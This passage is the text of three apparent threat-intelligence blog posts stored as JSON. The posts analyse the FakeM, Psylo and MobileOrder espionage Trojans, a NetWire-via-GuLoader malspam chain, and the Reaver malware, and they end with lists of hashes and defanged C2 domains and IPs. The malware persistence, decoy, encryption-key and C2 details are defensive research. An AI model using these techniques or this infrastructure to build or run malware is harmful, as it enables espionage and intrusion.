                "Interesting enough is that CryptGenRandom calls RtlGenRandom, which uses QueryPerformanceCounter along with other system attributes to generate a random number."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When communicating with its C2 server, Psylo will use HTTPS with a unique user-agent of (notice the lack of a space between \"5.0\" and \"(Windows\"):"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Mozilla/5.0(Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 does not consider Psylo another variant of FakeM because Psylo has a command handler that differs dramatically from FakeM. Table 5 shows the Psylo command handler, which suggests it is less modular and supports more embedded functionality when compared to FakeM. It is possible that the threat actors created this Trojan as a standalone alternative to FakeM."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 5: Command handler in Psylo that differs dramatically from FakeM"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another discovery we made while researching this blog is an overlap between Psylo infrastructure and a Trojan focused on compromising Android mobile devices.",
                "Unit 42 tracks this mobile Trojan as MobileOrder, as the authors specifically refer to commands within the app as orders.",
                "The connection between FakeM, Psylo, and MobileOrder suggest that Scarlet Mimic is now expanding their espionage efforts from PCs to mobile devices, which marks a major shift in tactics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MobileOrder starts by registering itself as device administrator so that a normal user cannot uninstall it by simply clicking uninstall in settings.",
                "It will copy an embedded PDF file from res/raw/rd.pdf to SD card \"/android/9074ca3f18e201c204ec1d852264bb5432644ba46f54f361a146957.pdf\" and launches the mobile devices default PDF viewer to display this PDF file, which acts as a decoy document.",
                "After displaying the decoy document, the malicious code runs in background.",
                "The malicious code consists of the following parts:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware uses the AMAP SDK to get accurate location of infected devices by GPS, mobile network (such as base stations), WiFi and other information.",
                "MobileOrder acts on instructions provided by its C2 server, which it communicates with over TCP port 3728.",
                "All C2 communications are encrypted with the AES algorithm using a key generated by computing five MD5 hashes starting with the key \"1qazxcvbnm\", and adding a salt value of .)1/ in each iteration."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond to requests from MobileOrder with commands that the Trojan refers to as orders.",
                "MobileOrder contains a command handler with functionality that provides a fairly robust set of commands, as seen in Table 6.",
                "The first byte of data provided by the C2 server is order number, which is followed by the encrypted data that needed to carry out the specific order."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6: MobileOrder command handler"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There is some infrastructure overlap in the C2 servers used by almost all of the FakeM variants, as well other Trojans such as MobileOrder, Psylo, and CallMe.",
                "There are also infrastructure ties between some FakeM variants and older activity using Trojans such as Elirks, Poison Ivy, and BiFrost, which were used in attacks as old as 2009.",
                "The domain names used to host C2 servers are a mix of actor-registered and Dynamic DNS (DDNS,) though most are DDNS.",
                "The DDNS domains in turn are linked to a small grouping of ASNs, with one ASN often largely tied to one FakeM variant.",
                "Most of the FakeM MSN C2s resolve to IP addresses associated with ASN 22781",
                "(RBLHST - Reliablehosting.com).",
                "However, we found one MSN sample that shared infrastructure with some FakeM Custom SSL variants."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There is a similar overlap between FakeM MSN, FakeM HTML, and FakeM SSL.",
                "The registrant email xsldmt@xj163[.]cn was used to register several domains used as C2s: yourturbe[.]org, websurprisemail[.]com and googmail[.]org.",
                "One of these domains was also used in the 2013 CallMe activity at the same time it was being used for FakeM MSN samples.",
                "The targeting and decoy style also matches with the FakeM activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There is PE resource overlap between some FakeM MSN samples and some samples of the BiFrost and Poison Ivy Trojan.",
                "This may indicate that the same developer who created the particular BiFrost and Poison Ivy samples was also involved in developing FakeM MSN. Unit 42 found an overlap between the RT_VERSION resources, which contains the version information of a Portable Executable (PE) file, shared amongst the three different Trojans.",
                "The shared RT_VERSION resource (MD5: 55b7a118203a831cc69b37b785015c54) contained the following information:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Comments: Release\nCompanyName: Develop Team\nFileDescription: Utility Application\nFileVersion: 4.0\nInternalName: Utility\nLegalCopyright: Copyright (C) 2008\nLegalTrademarks: DT.Inc\nOriginalFilename: Utility.EXE\nPrivateBuild: 4.0b\nProductName: Utility Application\nProductVersion: 4.0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The overlap between Elirks, FakeM SSL, Psylo, and MobileOrder exists entirely in their command and control infrastructure, through domain names and/or IP resolution.",
                "Samples of these three used some of the same C2 domains, notably lenovositegroup[.]com, ufoneconference[.]com, and websurprisemail[.]com, while some resolution overlap includes 118.193.212[.]12, 210.206.219[.]241, and 59.188.239[.]117.",
                "Similarly, some FakeM Yahoo C2 domains and FakeM Custom SSL C2 domains also have overlapping IP resolutions, notably 95.154.204[.]198."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Scarlet Mimic also uses the infamous HTRAN tool on at least some of their C2 servers.",
                "HTRAN is a proxying tool that allows actors to conceal the true location of their C2 server.",
                "Actors will run HTRAN on a server and configure their malware to interact with that server; however, the actor will configure HTRAN to forward traffic to another server where the actual C2 server exists.",
                "For example, the FakeM C2 domain of muslim.islamhood[.]net[1] resolved to the IP address 59.188.239.117 during analysis, but the server responded with the following error message:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "[SERVER]connection to 68.71.35.135:8081 error"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This error message suggests that the HTRAN application running on 59.188.239.117 was unable to connect to the real C2 server hosted at 68.71.35.135."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Throughout this report, we have referenced multiple previous blogs and white papers, from Unit 42 and others, that have documented elements of this threat in the past.",
                "In addition to those documents readers may also find the following publications interesting."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In 2014, Citizen Lab released a paper on threats against civil society that referenced some of these attacks as the Domain Name Family or DNF."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Kaspersky Lab has produced excellent research on attacks against Uyghur and Tibetan activists.",
                "In 2013, they identified an Android Trojan that was also targeting these groups.",
                "Our analysis indicates this malware is different from the MobileOrder Trojan described above, but they serve very similar purposes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On January 12, 2016, Cylance published a blog linking an exploit document to the group Mandiant refers to as APT2 and CrowdStrike as Putter Panda.",
                "While there does appear to be a small overlap between IP addresses used in attacks from this group and those of Scarlet Mimic, our team has not concluded that these groups are one in the same."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The information discovered by Unit 42 and shared here indicates Scarlet Mimic is likely a well-funded and skillfully resourced cyber adversary.",
                "Scarlet Mimic has carried out attacks using both spear-phishing and watering holes since at least 2009 with increasingly advanced malware, and has deployed malware to attack multiple operating systems and platforms.",
                "Despite the apparent technical acumen, their decoy documents are typically not well crafted regardless of the use of the targets language, though they do use timely subject lures."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The primary source of data used in this analysis is Palo Alto Networks WildFire, which analyzes malware used in attacks from around the globe.",
                "The system is also fed with malware samples collected through sharing partnership with other security vendors, including our partners in the Cyber Threat Alliance.",
                "To connect attacks to each other based on malware behavior and command and control infrastructure, we relied on Palo Alto Networks AutoFocus threat intelligence.",
                "AutoFocus users can view all of the files related to Scarlet Mimic and the malware associated with the group using the following links:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from Scarlet Mimic attacks through many components of our platform."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12dedcdda853da9846014186e6b4a5d6a82ba0cf61d7fa4cbe444a010f682b5d\n33e50c44804d4838dba6627b08210029ff9106fa7fd16cd7255271e153f58b05\n3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520\n5182dc8667432d76a276dc4f864cdfcef3e481783ebaf46d3b1397080b798f4a\n523ad50b498bfb5ab688d9b1958c8058f905b634befc65e96f9f947e40893e5b\n5dade00db195087aa336ce190b5fd1c22992c49556c623b42a9f742d73241a7f\n7156f6416e7116e52f9c67f4e716b1dbea17387e61009c7f2825debbbb4dcb73\n79aca57905cca1e56b0cedf48a4d81812639c333ee6532d90a074d64b3852d6f\n879edf0417c4a9759040b51bf83b2fc918a6644a7c29a52252003a63036aea5c\n9b77bbb620f50632fae17c40c7469fc93ffdbc4136a6d893a9a10a44bc435da5\na1b7fe2acdb7a5b0c52b7c1960cfad531a7ca85b602fc90044c57a2b2531699f\na268cc4931781d1d8094a4f8f596c2de3d662f2581c735b0810ff0ecefe3f859\na4abbcfdbf4a6c52349a843eac0396e6d8abb05f1324223980d824629a42ef7a\na569f3b02a4be99e0b4a9f1cff43115da803f0660dd4df114b624316f3f63dc6\nb4c1e9c99f861a4dd7654dcc3548ab5ddc15ee5feb9690b9f716c4849714b20d\nbbdedcfe789641e7f244700e8c028ef51094b66508f503876eb0d6aa16df6aa8\nc7b9e6b5ab07e6da404af9894c8422d9a0c9586334ddc0a3c1ea6bf23ef97fb2\ncaeace73a17e220634525d2a4117525fd60cb86a06873c86571e89d156f8d72d\ncaf76e19a2681dd000c96d8389afc749e774c083aef09f023d4f42fbc49d4d3d\ne96097826179a66cc3061be0f99f7b55cc9692a6378b5c4364699327823098ab\nf511b13341c9fb4ec9ecfcfe5a5813b964c362d7c709c402ead4e010d857bf6c\nfa08a498da0b31e77669d51a28dff166d84983fa6af693063c08f312fdce93e3\ndf9872d1dc1dbb101bf83c7e7d689d2d6df09966481a365f92cd451ef55f047d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0aab09bf0db30a4be28d19475082fd5e7f75879bf9029fdd8dfc3a1e1f072b0c\n2e1472a65a8df43c8bc9b0aff954fbc1a093c4214f6a718a08e1321db83ca683\n3209ab95ca7ee7d8c0140f95bdb61a37d69810a7a23d90d63ecc69cc8c51db90\n41948c73b776b673f954f497e09cc469d55f27e7b6e19acb41b77f7e64c50a33\n4a4dfffae6fc8be77ac9b2c67da547f0d57ffae59e0687a356f5105fdddc88a3\n5154511a439bb367b7dd56232eb15281cb6dc4d64ea3a06e7fbbe6b176e385d4\n5fae5750797ebe7e7a6a6919a7d66deffb141ec28737bd72a1f7da8edd330b60\naa8a302a53bd39b2d2a6e3d8497575e2a5f9757b248e34c8e0821ce9eee5cc32\nb3c9bb22fa1bc358dc23a1a4bdaf85ad1add4d812b107b7ab887affbf689933a\ncd506679fd32dab16dee6fbf1cfdfe0836e092a4f5669418a199d99c9cd33abd\nd1dd4469c7b5c462e5ff2dcef5d22775250e9ebf395f65da624f18ea7144e173\nd698008e417da867d02e2f5cdcc80ff92af753dd585fada42fc611c2d7332c3a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "53af257a42a8f182e97dcbb8d22227c27d654bea756d7f34a80cc7982b70aa60\n9adda3d95535c6cf83a1ba08fe83f718f5c722e06d0caff8eab4a564185971c5\n53cecc0d0f6924eacd23c49d0d95a6381834360fbbe2356778feb8dd396d723e\n631fc66e57acd52284aba2608e6f31ba19e2807367e33d8704f572f6af6bd9c3\n7bfbf49aa71b8235a16792ef721b7e4195df11cb75371f651595b37690d108c8\n7c9421a4605decfa1b3e22addbca98d86ea757dcd8ff8e075d13228c99618637\n202975d10ba417cf441e8f9986d2496807fe39e057d3226ec3b2713f0c218cd8\n22e7517d8996e92998eb996416f9d8ef06b3b1c220c1a5d29ccd5aaef7b10c72\n435df30d139ccbe5ce4e5ca6fe072e42e96d5ea1efd5317deebce462ecccc7ab\n47d9ba5f7bf70c5d2b7a832e070957cc7ebdcfd0a6ee75851df16dc45971ce8a\n4a3d0df9fa198a7ebe45db5239d22067e74924b1aace52029b3acc9b51af691e\n4d539f638ed476ca08da838cdfbf710dae82b582256d60a009e9d304f6822e65\nbe0e8da7e261ec7d08eaa78e79ceb1be47c324b8e142097bf6569f9471c98a4e\nc30d03750458bb5f2b03d6bd399ffca6d378a3adb5a74bee3b6ba4b982dbf273\ncc7db456825e266849090b6fa95a94ad8c4c717712b610b0d39077af5222f4be\nd6d2a77f8ed2fe9fed9ee6dcb4cc0b339ba47a575c717c35815243c752d8f60c\ndb8338e6b883fdceaa02c10ad683547a26ae32e0d4641cc24c7bd3b45154abb0\ne8e5ecf525c5259651bfbdf1923215729ec67658225eca1b02519f5f6279eacb\nec4deb761b09ddc706804ef669836cf4b199f1d74b14ad623a6f6cc2f38190b8\n669ce0975c133d54e414dbf1de546aed742e76fe3e60568e2bd4747b7e0f8b70\n0d77f5f1d4c0f02fb88ac33fa365b17d28d1521cea59329ca4b3dd0b7031a60e\n363d9557861fab2d83d04847b967996361e670e571b335c7a535bc6278cba149\n7fb2c37431fd7b05414b134732ba0b29cd7dad17fc176627ee0815aac60c1ab9\n77e4ef9e08f1095487b4fa27492b4c9b8e833f29598f99a0d10f7c85b4254761\na4ffca5f1c3d9c21629fa98a1e91121d954ab9347e86ac3c9613dae61bf30393\n428121c421bf81a0d689014cf21ec7951b0c32add86198e06f7d636981f68755\na195f564aa2fb66db119e2fbec93e319a973e5cf50fbf9fc08bd81f9b7ee8af8\nc1e8ff8ebe3754bc7d14509ef3678edf7551d876d3fa847d07d469c09bceae91\n53238f67ac7e4cc27264efbacc8712bd97a5775feaf633c63adaa0785d038e8a\n508a7cab0f2a69ba66e92e86817a49ecd1b9c8ae11a995147944995fc868dfad\nfb60d14de4dba022f11437845d465a661d0c78d3d097a38770816f06992bf0af\n8da2f9afd914a4318a97f4d74809c0c383f8ebf0d3d6e3d3715efbd71a66a52f\n6fe33c672fd30bba9bbc89dc7d88993d8783382c9f9c510677b1bb068a5f1e51\n6a1c7999b4ba92899d3364fc729d0f052680be5a71dd0f13cbabdb19b82bf858\n5db51f2f7c31de7d165ec4892ae7dcedaa036caedeef718b57953d7935582f04\n27167a9d63f5ddc68a12decb1a1e0a2a29c72fe0681dca2c4f3d169f048a9d38\n6f10c892133b5dac6c40cfe77ca32b42572bc56909481b236080dfc143ef9afd\nde12cd8d11478d17342c60239837c1afcc9fee72df6ffdf9943802640d43f77a\n0f2db64b8283b76d49c9bb272beafab8323f941b6dc3888b42ff02f08634d016"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "19bbee954ac1a21595e63cb86d1a596236aed353804aec5cb8adfa62e70280d3\na9f0bddc3d3516af8355e8ac17309528cd018347e5f56a347c14da0a83b0028a\n00bb399c429e0f1f7de751103fe92b5f820d1686d01662a08583b7a94aaed94e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "03004ccc23033a09532bea7dfa08c8dfa85814a15f5e3aedb924a028bcd6f908"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "071c34b9701dd84f9590ba899a8af3eeec228a928f2d98a80dbc780e396ee01a\nd1f0658bbb15ab2bccc210d7e1f21b96e14ae22de8494ca95b12e182f3d0f693\n9ff687a813a5cb5ff10374c86f852534c1aa3e5a221123214bf52b2ff455a5da\n8c423506c0c7ebe1e61071374ecf0806463a02a2100b5daa1bd942129ff8a235\n91e36e720477146f1a0c050d3bc74bc6683a03e7631317ded3c598a10465dcc8\nc981db20d588ba2d0f437b4e5459e7c6763f52a97841450c94591ca28a9a2d69\n95dba004f949e44cb447246f3d2420b01db4541d0e4fa7b00d798f38a3d251e4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aaa123.spdns[.]de\nadmin.spdns[.]org\ndetail43.myfirewall[.]org\neconomy.spdns[.]de\nfirefox.spdns[.]de\nfirewallupdate.firewall-gateway[.]net\nintersecurity.firewall-gateway[.]com\nkaspersky.firewall-gateway[.]net\nkasperskysecurity.firewall-gateway[.]com\nkissecurity.firewall-gateway[.]net\nmail.firewall-gateway[.]com\nnews.firewall-gateway[.]com\nopero.spdns[.]org\nsys.firewall-gateway[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "account.websurprisemail[.]com\naddi.apple.cloudns[.]org\nbailee.alanna.cloudns[.]biz\nbee.aoto.cloudns[.]org\nbook.websurprisemail[.]com\ndesk.websurprisemail[.]com\ndolat.diyarpakzimin[.]com\ndolat.websurprisemail[.]com\ndolet.websurprisemail[.]com\ngithub.ignorelist[.]com\nislam.youtubesitegroup[.]com\nmareva.catherine.cloudns[.]us\nmuslim.islamhood[.]net\np.klark.cloudns[.]in\nppcc.vasilevich.cloudns[.]info\npress.ufoneconference[.]com\nvip.yahoo.cloudns[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "207.204.225[.]117\naccounts.yourturbe[.]org\naddnow.zapto[.]org\nbits.githubs[.]net\nclean.popqueen.cloudns[.]org\neconomy.spdns[.]eu\neemete.freetcp[.]com\nemail.googmail[.]org\nfish.seafood.cloudns[.]org\nfreeavg.sytes[.]net\nfreeonline.3d-game[.]com\nibmcorp.slyip[.]com\nlemondtree.freetcp[.]com\nliumingzhen.myftp[.]org\nliumingzhen.zapto[.]org\nn.popqueen.cloudns[.]org\nnews.googmail[.]org\noic-oci.3-a[.]net\npolat.googmail[.]org\nqq.ufoneconference[.]com\nqq.yourturbe[.]org\nsisiow.slyip[.]com\nupdate.googmail[.]org\nuprnd.flnet[.]org\nvideo.googmail[.]org\nwebmail.yourturbe[.]org\nworldwildlife.effers[.]com\nwww.angleegg.ddns[.]us\nwww.angleegg.xxxy[.]info\nwww.googmail[.]org\nyouturbe.co[.]cc\nyycc.mrbonus[.]com\nzjhao.dtdns[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "apple.lenovositegroup[.]com\nmm.lenovositegroup[.]com\nftp112.lenta.cloudns[.]pw\nwww.gorlan.cloudns[.]pro\notcgk.border.cloudns[.]pw"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ziba.lenovositegroup[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "apple12.crabdance[.]com\nupdate.googmail[.]org\napple12.crabdance[.]com\nalma.apple.cloudns[.]org"
            ]
        }
    ],
    "7320445d0694df796b5e9d99a1a9a1dc3a66d0e0": [
        {
            "type": "paragraph",
            "content": [
                "NetWire is a publicly-available RAT that has been used by criminal organizations and other malicious groups since 2012.",
                "NetWire is distributed through various campaigns, and we usually see it sent through malicious spam (malspam).",
                "GuLoader is a file downloader that was first discovered in December 2019, and it has been used to distribute a wide variety of remote administration tool (RAT) malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog reviews a recent distribution chain in March 2020 using Microsoft Word documents to distribute NetWire through GuLoader.",
                "We review the infection chain of events, examine the associated network traffic, and cover post-infection artifacts from an infected Windows host.",
                "This material is primarily helpful to Security Operations Center (SOC) personnel like front-line analysts and people who perform forensic investigations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog covers the following areas:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This chain of events kicks off with an email.",
                "The email contains a web link for a Microsoft Word document.",
                "The Word document has macro code that retrieves a Windows executable for GuLoader.",
                "The executable retrieves an encrypted data file used for NetWire.",
                "Then we see command and control (C2) traffic for NetWire RAT activity.",
                "See Figure 1 for a flow chart of this infection chain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malspam distributing NetWire typically uses attachments or links for the malware.",
                "Figure 2 shows one such example from August 2019 with both an attachment and a link for the same Word document to kick off a NetWire RAT infection."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GuLoader is now widely used for RAT distribution in 2020 and we continue to see the same type of email lures for malspam pushing NetWIre RAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For an infection chain from March 2020, we clicked on an email link discovered through AutoFocus to retrieve a malicious Word document as shown in Figure 3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our research led us to two links that generated similar infection chains:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both links returned Word documents for the same type of NetWire RAT activity.",
                "Each document used a different template.",
                "Compare Figure 4 with Figure 5 to see the difference in each document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Enabling macros for each of these Word documents generated an infection on a vulnerable Windows host.",
                "Each vulnerable host retrieved an initial binary for GuLoader and ran it from the infected users AppData\\Local\\Temp directory.",
                "Figure 7 and Figure 8 show examples from each Word document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pcaps of the infection traffic revealed the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "See Figure 9 and Figure 10 for images of the traffic filtered in Wireshark."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This March 2020 infection traffic follows the same concept for GuLoader to RAT activity discussed in a previous analysis of GuLoader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A copy of the initial EXE for GuLoader is made persistent, then the original is deleted from the infected users AppData\\Local\\Temp directory where it was originally saved.",
                "The GuLoader EXE is persistent through the Windows Registry under the following key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Two examples of this Registry update are shown in Figure 11 and Figure 12."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because this is ultimately a NetWire RAT infection, we can also find a registry update at HKCU\\Software\\NetWire like the example shown in Figure 13."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We can also find artifacts associated with a NetWire infection as shown in Figure 14 and Figure 15."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These types of infections are not very effective against Windows 10 hosts using default security settings.",
                "Versions of Microsoft Office since 2013 have Protected View enabled by default that prevents users from enabling macros in Word documents downloaded from the Internet.",
                "Furthermore, Real-time protection and Tamper protection settings in Windows Defender were remarkably effective in preventing these infections within a Windows 10 test environment.",
                "Finally, within 24 hours of discovery, URLs serving the malware associated with these infections had been taken off-line."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, criminal distribution of RATs and other types of commodity malware are often a cat-and-mouse game against security vendors.",
                "After one wave of malware is distributed, the binaries are updated, and another wave is quickly released into the wild.",
                "These efforts rely on wide-scale distribution from the criminals and poor security practices among potential victims.",
                "Only a small percentage infection attempts need to be successful for these efforts to be cost-effective."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are further protected through our threat prevention platform which is designed to detect and block such threats, and AutoFocus shows these binaries as malicious.",
                "As long as this type of malware distribution remains cost-effective, criminals will continue to pursue such methods of attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infection traffic - first run on 2020-03-25"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infection traffic - second run on 2020-03-25"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware - first run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cc554633c0b734778211a6289e1d6d383d734a3e1a8edeb13d6d0fafc8a2f162"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4d373131b0d3254d72f1a06ea168267376b8cc8f805daa53963db5f051631967"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aadc6031fed895de570214afb8b6cdc66f17d01f1df0407f4d57f1d04313ae2b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malware - second run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c87e798118a539a136baa0bb9d2539a6e074b0ee640cf0a4ed1ef17936f69ebf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e895c525a99922beedf02ca7742c49f320448522185bec8f7d2a49d6cee9f24"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "661d9c0c23e9c17412eee8d72cc1bb66c1b4e5f73908c8cce48f89420f38b205"
            ]
        }
    ],
    "c7d70cc2d13aa1830095f96cbf458dfd486603f4": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nUnit 42 has discovered a new malware family weve named Reaver with ties to attackers who use SunOrcal malware.",
                "SunOrcal activity has been documented to at least 2013, and based on metadata surrounding some of the C2s, may have been active as early as 2010.",
                "The new family appears to have been in the wild since late 2016 and to date we have only identified 10 unique samples, indicating it may be sparingly used.",
                "Reaver is also somewhat unique in the fact that its final payload is in the form of a Control panel item, or CPL file.",
                "To date, only 0.006% of all malware seen by Palo Alto Networks employs this technique, indicating that it is in fact fairly rare.",
                "While we dont have information on the intended targets in this case, previous reports on this activity have identified targeting primarily among the Five Poisons which are movements the Chinese government perceives as dangerous.",
                "They are:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attackers used both families concurrently from late last year through November 2017 and there is some C2 infrastructure overlap between the two families, as well as links to historical reporting.",
                "We explore those ties and provide an in-depth analysis of the new malware below.",
                "Reaver Malware Analysis\nTo date, Palo Alto Networks Unit 42 has identified 10 unique samples and three distinct variants of a new malware family we have named Reaver.",
                "As such, we identify each variant as Reaver.v1, Reaver.v2, and Reaver.v3.",
                "Reaver.v1 has been observed delivering a payload that uses HTTP for network communication, while versions 2 and 3 use a payload that uses raw TCP connections for this communication.",
                "The flow for Reaver is as shown:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Reaver execution flow diagram"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver.v1\nThe earliest variant of Reaver begins by attempting to enable the SeDebugPrivilege privilege for the running process.",
                "In the event this is successful the malware will use the following path to store any dropped files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the event it is not successful, this alternative path will be used instead:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It proceeds to load and decrypt and embedded bitmap resource file.",
                "This decrypted data is written to the following location:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This WUpdate.~tmp file is then copied to a filename of Applet.cpl, which is placed in the previously identified file path.",
                "The malware proceeds to identify the file path of either the common startup folder, or the users startup folder depending on if the SeDebugPrivilege privilege was obtained.",
                "In the event this privilege was obtained, the common startup folder is queried by reading the following registry key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Alternatively, if the privilege was unable to be obtained, Reaver.v2 will obtain the users startup folder by querying the following registry key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver proceeds to write a shortcut file to %TEMP%\\~WUpdate.lnk.",
                "This file is then copied to a filename of Windows Update.lnk, which is placed in the startup path previously identified.",
                "This shortcut file points to the path of the previously written Applet.cpl file.",
                "Finally, Reaver.v1 will execute the ~WUpdate.lnk file in a new process, thus loading the recently dropped malicious CPL file.\n\n Reaver.v2\nReaver.v2 begins by attempting to enable the SeDebugPrivilege privilege for the running process.",
                "In the event this is successful, the malware will use the following path to store any dropped files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the event it is not successful, this alternative path will be used instead:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine.",
                "This file is written to the following file path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the file is written, it is then copied to a filename of winhelp.cpl in the directory that was initially chosen.",
                "After this file is copied, the original Update.~tmp file is deleted.",
                "At this stage the malware will identify the correct startup path using the same technique witnessed in earlier variants.",
                "A shortcut file is generated in the following path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This ~Update.lnk file is then copied to a filename of Windows help.lnk, which is placed in the startup path previously identified.",
                "This shortcut file points to the path of the previously written winhelp.cpl file.",
                "It will specifically load this CPL file via a call to the built-in Microsoft Windows control.exe utility.",
                "Finally, Reaver.v2 will execute the ~Update.lnk file in a new process, thus loading the recently dropped malicious CPL file.\n\nReaver.v3\nLike Reaver.v2, Reaver.v3 begins by attempting to enable the SeDebugPrivilege privilege for the running process.",
                "In the event this is successful, the malware will use the following path to store any dropped files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the event it is not successful, this alternative path will be used instead:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver.v3 proceeds to write an embedded Microsoft Cabinet (CAB) file to the following location:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This cabinet file is then extracted to the previously identified file path.",
                "The contents of this cabinet file consist of a Microsoft Control Panel item with a filename of winhelp.cpl.",
                "Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use.",
                "Again, a shortcut file is written to the %TEMP% path with a name of ~Update.lnk, which is in turn copied to the identified startup path with a filename of Windows help.lnk.",
                "This shortcut file calls the built-in control.exe utility to in turn load the previously dropped malicious CPL file of winhelp.cpl.",
                "Finally, the malware calls the winhelp.cpl file in a new process via the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver HTTP Payload\nThe malicious CPL payload of Reaver has the following two exported functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the CPlApplet function is loaded, Reaver will initially determine if the SeDebugPrivilege privilege is able to be obtained.",
                "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine.",
                "The following example decrypted configuration is as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see, the following information is present within this configuration:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver continues to collect various information from the victim machine, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to communicate with the remote server via HTTP GET and POST requests.",
                "Data that is sent is compressed and then base64-encoded before being included in the requests.",
                "We have observed the following capabilities of this payload:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver TCP Payload\nThe malicious CPL payload of Reaver has the following three exported functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the malware is initially loaded, DllEntryPoint will be called, which in turn will call a function that is responsible for decompressing a blob of data.",
                "The decompressed data consists of various key/value pairings that represent important strings used by Reaver.",
                "An example of this decompressed data can be seen below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the malware wishes to retrieve one of these decoded strings, it will simply call a function with an integer argument that is responsible for providing it.",
                "For example, calling this function with an argument of 10001 would retrieve a string of ole32.dll.",
                "The DllEntryPoint function proceeds to attempt to obtain the SeDebugPrivilege privilege, and also calls WSAStartup for future network activity.",
